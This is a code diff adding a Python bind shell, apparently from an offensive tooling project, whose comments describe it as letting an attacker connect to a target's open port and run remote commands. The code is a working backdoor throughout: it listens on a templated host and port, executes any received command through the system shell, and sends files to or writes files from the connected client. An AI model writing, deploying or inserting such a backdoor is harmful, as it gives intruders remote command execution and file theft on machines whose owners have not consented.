@@ -1,0 +1,126 @@
+#// - Establishes a bind TCP connection on the target machine's specified IP and port.
+#// - The attacker connects to the target's open port to execute remote commands.
+
+import os
+import socket
+import logging
+import threading
+import subprocess
+
+LISTENER_HOST = "${LISTENER_HOST}"
+LISTENER_PORT = "${LISTENER_PORT}"
+
+logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
+
+class BindShell:
+    def __init__(self, host: str, port: int):
+        self.host = host
+        self.port = port
+        self.server_socket = None
+        self.client_socket = None
+        self.client_address = None
+
+    def start_listening(self):
+        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        try:
+            self.server_socket.bind((self.host, self.port))
+            self.server_socket.listen(5)
+            logging.info(f"Listening on {self.host}:{self.port}...")
+        except Exception as e:
+            logging.error(f"Error while binding or listening on {self.host}:{self.port}: {e}")
+            return
+
+        while True:
+            try:
+                self.client_socket, self.client_address = self.server_socket.accept()
+                logging.info(f"[*] Connection established from {self.client_address}")
+                self.handle_client()
+            except KeyboardInterrupt:
+                logging.info("Server interrupted by user. Exiting.")
+                break
+            except Exception as e:
+                logging.error(f"Error while accepting connection: {e}")
+                continue
+
+    def handle_client(self):
+        while True:
+            try:
+                self.client_socket.send(f"{os.uname().nodename} >> ".encode())
+                command = self.client_socket.recv(1024).decode().strip()
+                if command:
+                    output = self.command_execution(command)
+                    self.client_socket.send(output.encode())
+                else:
+                    continue
+            except BrokenPipeError:
+                logging.warning("Client connection lost.")
+                break
+            except Exception as e:
+                logging.error(f"Error while handling client: {e}")
+                continue
+
+    def command_execution(self, command: str) -> str:
+        output = ""
+        try:
+            if command.startswith("cd"):
+                output = self.change_directory(command)
+            elif command.startswith("download"):
+                output = self.download_file(command)
+            elif command.startswith("upload"):
+                output = self.upload_file(command)
+            else:
+                output = self.execute_system_command(command)
+        except Exception as e:
+            output = f"Error: {e}\n"
+        return output
+
+    def change_directory(self, command: str) -> str:
+        path = command[3:].strip()
+        if path:
+            try:
+                os.chdir(path)
+                return f"Changed directory to: {os.getcwd()}\n"
+            except Exception as e:
+                return f"Error: {str(e)}\n"
+        else:
+            return "Usage: cd <directory>\n"
+
+    def download_file(self, command: str) -> str:
+        file_path = command[9:].strip()
+        if os.path.exists(file_path):
+            try:
+                with open(file_path, "rb") as f:
+                    self.client_socket.sendall(f.read())
+                return f"File {file_path} sent successfully.\n"
+            except Exception as e:
+                return f"Error sending file: {str(e)}\n"
+        else:
+            return f"File not found: {file_path}\n"
+
+    def upload_file(self, command: str) -> str:
+        file_name = command[7:].strip()
+        try:
+            with open(file_name, "wb") as f:
+                data = self.client_socket.recv(4096)
+                f.write(data)
+            return f"File {file_name} uploaded successfully.\n"
+        except Exception as e:
+            return f"Error uploading file: {str(e)}\n"
+
+    def execute_system_command(self, command: str) -> str:
+        try:
+            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
+            return output
+        except subprocess.CalledProcessError as e:
+            return f"Command failed: {str(e.output).strip()}\n"
+        except Exception as e:
+            return f"Error executing command: {str(e)}\n"
+
+    def close_connection(self):
+        if self.client_socket:
+            self.client_socket.close()
+
+if __name__ == "__main__":
+    t1 = threading.Thread(target=BindShell(host=LISTENER_HOST, port=int(LISTENER_PORT)).start_listening(), daemon=True)
+    t1.start()
+    t1.join()
